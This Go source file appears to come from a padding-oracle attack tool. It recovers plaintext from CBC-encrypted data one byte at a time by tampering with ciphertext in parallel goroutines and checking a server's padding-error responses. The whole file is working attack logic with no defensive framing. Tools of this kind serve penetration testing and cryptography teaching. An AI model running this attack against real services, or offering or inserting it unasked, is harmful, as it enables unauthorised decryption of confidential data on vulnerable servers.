package main

import (
	"context"
	"fmt"
)

var overall = 0

func decipherChunk(chunk []byte, outChan chan byte) ([]byte, error) {
	// create buffer to store the deciphered block of plaintext
	plainText := make([]byte, blockLen)

	// we start with the last byte of first block
	// and repeat the same procedure for every byte in that block
	for pos := blockLen - 1; pos >= 0; pos-- {
		originalByte := chunk[pos]

		// find byte which doesn't produce a padding error
		found, foundByte, err := findGoodByte(chunk, pos, originalByte)
		if err != nil {
			return nil, err
		}

		// okay, let's check
		if !found {
			// well, seems like the only valid padding is the original byte
			// that can happen if we just hit the original padding
			// so, let it be, but also check that to be sure
			chunk[pos] = originalByte
			paddingError, err := isPaddingError(chunk, nil)
			if err != nil {
				return nil, err
			}

			if paddingError {
				return nil, fmt.Errorf("Failed to decrypt, not a byte got in without padding error. \nThe root cause migth be in Unpadding implementation on the server side!")
			}

			foundByte = originalByte
		}

		// okay, now that we found the byte that fits, we can reveal the plaintext byte with some XOR magic
		currPaddingValue := byte(16 - pos)
		plainText[pos] = foundByte ^ originalByte ^ currPaddingValue
		if outChan != nil {
			outChan <- plainText[pos]
		}

		/* we actually need to repair the padding for the next shot
		e.g. we need to adjust the already tapered bytes block*/
		chunk[pos] = foundByte
		nextPaddingValue := currPaddingValue + 1
		adjustingValue := currPaddingValue ^ nextPaddingValue
		for i := pos; i < blockLen; i++ {
			chunk[i] ^= adjustingValue
		}
	}

	return plainText, nil
}

func findGoodByte(chunk []byte, pos int, original byte) (bool, byte, error) {
	// the common steps before we hit the parallel universe
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	chanErr := make(chan error)
	chanVal := make(chan byte)
	chanPara := make(chan byte, parallel)
	chanDone := make(chan byte, parallel)

	for i := 0; i <= 0xff; i++ {
		tamperedByte := byte(i)

		// we skip the original byte, to avoid false-positive when hitting original padding
		// but we can come back to it later as for the last resort
		if tamperedByte == original {
			continue
		}

		go func(value byte) {
			// report that we're done, later
			defer func() { chanDone <- 0 }()

			// parallel goroutine control channel
			chanPara <- 1
			defer func() { <-chanPara }()

			// copy chunk to make tamepering thread-safe
			chunkCopy := make([]byte, len(chunk))
			copy(chunkCopy, chunk)
			chunkCopy[pos] = value

			// test for padding oracle
			paddingError, err := isPaddingError(chunkCopy, &ctx)

			// check for errors
			if err != nil {
				// context cancel error is ignored
				if ctx.Err() != context.Canceled {
					chanErr <- err
				}
				return
			}

			// if no padding error, report the found value
			if !paddingError {
				chanVal <- value
			}
		}(tamperedByte)
	}

	// now process the results
	done := 0
	for {
		select {
		case <-chanDone:
			done++
			if done == 0xff {
				return false, 0, nil
			}
		case err := <-chanErr:
			return false, 0, err
		case val := <-chanVal:
			return true, val, nil
		}
	}
}
